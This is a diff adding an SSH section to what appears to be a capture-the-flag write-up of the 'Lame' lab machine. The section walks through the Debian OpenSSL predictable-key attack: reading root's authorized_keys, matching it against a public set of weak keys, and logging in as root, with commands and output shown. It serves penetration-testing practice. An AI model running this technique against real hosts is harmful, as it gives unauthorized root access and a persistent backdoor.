@@ -656,3 +656,54 @@ uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
 whoami
 root
 ```
+
+### ssh
+
+SSH is also one of the open ports on the target. It can be used to leave a backdoor open if we want to by using the following technique - "Debian OpenSSL Predictable PRNG". 
+
+```bash 
+# After gaining a foothold on the target machine as non-privilege user, check if you have a read perm on /root/.ssh/authorized_keys
+ls -l /root/.ssh/
+total 8
+-rw-r--r-- 1 root root 405 2010-05-17 21:44 authorized_keys
+-rw-r--r-- 1 root root 442 2012-05-20 14:21 known_hosts
+
+# Now get the pubkey inside authorized_keys file
+less /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+
+# Download the git repo and extract the predictable rsa
+sudo git clone https://github.com/g0tmi1k/debian-ssh.git
+cd debian-ssh/common_keys
+sudo tar jxf debian_ssh_rsa_2048_x86.tar.bz2
+cd rsa
+
+# grep the pubkey to match its private key in the rsa directory
+grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w==
+57c3115d77c56390332dc5c49978627a-5429.pub
+
+
+#################################################################################
+
+ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
+The authenticity of host '10.10.10.3 (10.10.10.3)' can't be established.
+DSA key fingerprint is SHA256:kgTW5p1Amzh5MfHn9jIpZf2/pCIZq2TNrG9sh+fy95Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.3' (DSA) to the list of known hosts.
+
+Last login: Mon Nov  6 17:01:18 2023 from :0.0
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+root@lame:~# 
+```
